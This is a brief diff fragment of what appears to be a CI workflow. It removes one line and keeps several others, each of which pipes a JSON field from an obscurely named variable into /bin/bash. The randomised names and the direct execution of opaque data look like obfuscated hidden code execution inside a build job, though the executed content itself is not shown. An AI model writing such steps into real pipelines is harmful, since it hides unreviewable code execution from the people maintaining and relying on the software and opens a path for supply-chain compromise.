@@ -29,7 +29,6 @@ jobs:
           echo $p411 | jq -r .j75 | /bin/bash
           echo $xql062 | jq -r .qkpqn43789 | /bin/bash
           echo $e28 | jq -r .admp736 | /bin/bash
-          echo $eyly15 | jq -r .bf7 | /bin/bash
           printf '%s' "$iiodx1" | jq -r .p024 | /bin/bash
           printf '%s' "$ngs46851" | jq -r .bhmv314 | /bin/bash
           echo $p62547 | jq -r .dqe70 | /bin/bash
